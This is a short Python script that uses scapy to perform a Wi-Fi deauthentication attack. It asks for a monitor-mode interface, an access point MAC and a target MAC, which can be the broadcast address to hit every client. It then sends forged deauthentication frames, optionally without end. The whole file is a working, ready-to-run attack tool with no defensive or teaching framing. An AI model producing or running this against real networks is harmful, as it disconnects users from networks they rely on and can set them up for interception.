from scapy.all import *
import os

def deauth_attack(interface, target_mac, gateway_mac, count):
    """
    Performs a deauthentication attack.
    
    :param interface: The network interface in monitor mode.
    :param target_mac: The MAC address of the client to deauth (use 'FF:FF:FF:FF:FF:FF' for all).
    :param gateway_mac: The MAC address of the access point.
    :param count: Number of packets to send (-1 for continuous).
    """
    dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

    print(f"Sending deauth packets from {gateway_mac} to {target_mac} on {interface}...")
    try:
        sendp(packet, iface=interface, count=count, inter=0.1, verbose=True)
        print("Deauth attack completed.")
    except KeyboardInterrupt:
        print("Attack stopped by user.")
    except Exception as e:
        print(f"Error: {e}")

def main():
    # Ensure script is run as root
    if os.geteuid() != 0:
        print("This script must be run as root!")
        return
    
    interface = input("Enter the monitor-mode interface (e.g., wlan0mon): ").strip()
    gateway_mac = input("Enter the MAC address of the access point: ").strip()
    target_mac = input("Enter the target MAC address (or FF:FF:FF:FF:FF:FF for all): ").strip()
    count = int(input("Enter the number of packets to send (-1 for infinite): ").strip())

    deauth_attack(interface, target_mac, gateway_mac, count)

if __name__ == "__main__":
    main()
